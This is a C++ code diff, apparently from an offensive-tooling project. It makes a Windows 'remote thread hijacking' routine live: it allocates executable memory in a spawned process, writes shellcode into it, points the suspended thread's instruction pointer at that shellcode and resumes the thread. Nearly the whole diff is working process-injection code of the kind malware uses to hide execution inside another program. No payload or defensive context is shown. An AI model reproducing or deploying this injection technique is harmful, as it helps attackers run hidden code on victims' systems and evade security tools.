@@ -50,47 +50,73 @@ void remote_thread_hijacking(const unsigned char* shellcode, size_t shellcode_si
         &Pi // pointer to PROCESS_INFORMATION structure
     );
 
+    // from the PI we created we can extract the basics we need like handle and pid
     auto hProcess = Pi.hProcess;
+    DWORD ProcessId = Pi.dwProcessId;
+    auto hThread = Pi.hThread;
+    DWORD ThreadId = Pi.dwThreadId;
+    // DWORD OldProtection = NULL;
 
-    
-    // // allocate memory in the target process
-    // auto hMemory = VirtualAllocEx(
-    //     hProcess,
-    //     NULL,
-    //     shellcode_size,
-    //     MEM_COMMIT | MEM_RESERVE,
-    //     PAGE_EXECUTE_READWRITE
-    // );
 
-    // if(hMemory == NULL){
-    //     std::cout << "Welp we failed to reserve memeory in target process, the resason is: " << GetLastError() << std::endl;
-    //     CloseHandle(hProcess);
-    //     return;
-    // }
+    // allocate memory in the target process
+    auto hMemory = VirtualAllocEx(
+        hProcess,
+        NULL,
+        shellcode_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
 
-    // // write the shellcode to the allocated memory
-    // SIZE_T bytesWritten = 0;
-    // WriteProcessMemory(
-    //     hProcess,
-    //     hMemory,
-    //     shellcode,
-    //     shellcode_size,
-    //     &bytesWritten
-    // );
+    if(hMemory == NULL){
+        std::cout << "Welp we failed to reserve memeory in target process, the resason is: " << GetLastError() << std::endl;
+        CloseHandle(hProcess);
+        return;
+    }
 
-    // std::cout << "Wrote " << bytesWritten << " bytes to memory in target process" << std::endl;
+    // write the shellcode to the allocated memory
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        hProcess,
+        hMemory,
+        shellcode,
+        shellcode_size,
+        &bytesWritten
+    );
 
-    // // create a remote thread in the target process
-    // DWORD ThreadId;
-    // auto hThread = CreateRemoteThread(
-    //     hProcess,
-    //     NULL,
-    //     0,
-    //     (LPTHREAD_START_ROUTINE)hMemory,
-    //     NULL,
-    //     0,
-    //     &ThreadId
-    // );
+    std::cout << "Wrote " << bytesWritten << " bytes to memory in target process" << std::endl;
+
+
+    CONTEXT ctx{};
+
+    //getting the context of the remote thread
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(
+        hThread,
+        &ctx
+    );
+
+    // modifying the instruction pointer to point to our shellcode
+    ctx.Rip = (DWORD64)hMemory; // for x64 systems, use Eip for x86
+
+    // setting the modified context back to the remote thread
+    SetThreadContext(
+        hThread,
+        &ctx
+    );
+
+    // resume the remote thread to execute the shellcode
+    ResumeThread(
+        hThread
+    );
+
+    std::cout << "Successfully hijacked remote thread with ID: " << ThreadId << std::endl;
+
+    // wait for the remote process to finish
+    WaitForSingleObject(
+        hProcess, 
+        INFINITE
+    );
+
 
     // if(hThread == NULL){
     //     std::cout << "Welp we failed to create the remote thread, the resason is: " << GetLastError() << std::endl;
